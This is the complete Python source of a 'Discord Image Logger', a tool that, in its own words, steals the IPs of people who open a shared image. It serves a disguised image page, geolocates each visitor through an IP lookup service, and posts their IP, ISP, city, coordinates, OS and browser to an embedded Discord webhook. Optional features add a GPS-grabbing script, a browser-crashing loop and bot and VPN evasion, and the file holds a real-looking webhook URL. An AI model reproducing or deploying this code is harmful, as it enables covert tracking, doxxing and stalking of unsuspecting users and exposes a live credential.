# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1109467275427328021/0iHrAMUGjYTpxS7oVAXfSXgl4gdVa47c2r0IeyD0-zLcseo35NdU_MKRT4LRHJpp2IqZ",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
